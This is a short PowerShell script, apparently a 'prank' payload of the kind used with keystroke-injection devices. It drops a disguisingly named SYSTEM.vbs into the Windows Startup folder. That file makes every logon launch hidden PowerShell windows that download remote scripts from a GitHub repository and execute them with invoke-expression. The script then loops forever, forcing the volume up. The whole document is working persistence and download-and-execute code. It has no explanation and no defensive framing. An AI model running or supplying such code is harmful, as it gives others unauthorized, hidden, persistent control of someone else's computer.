cd 'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\'
Start-Sleep -Seconds 1
New-Item 'SYSTEM.vbs' -ItemType File
Start-Sleep -Seconds 1
$content = 'Set objShell = CreateObject("WScript.Shell"):objShell.Run("powershell.exe -w h $pl = iwr https://raw.githubusercontent.com/Falconnix/prank/main/Duck.ps1; invoke-expression $pl"):objShell.Run("powershell.exe -w h $pl = iwr https://raw.githubusercontent.com/Falconnix/prank/main/Volume.ps1; invoke-expression $pl"):objShell.Run("powershell.exe -w h $pl = iwr https://raw.githubusercontent.com/Falconnix/prank/main/beep.ps1; invoke-expression $pl")' | out-file -filepath SYSTEM.vbs

while (1) {Start-Sleep -Seconds 2;$k=[Math]::Ceiling(100/2);$o=New-Object -ComObject WScript.Shell;for($i = 0;$i -lt $k;$i++){$o.SendKeys([char] 175)}}
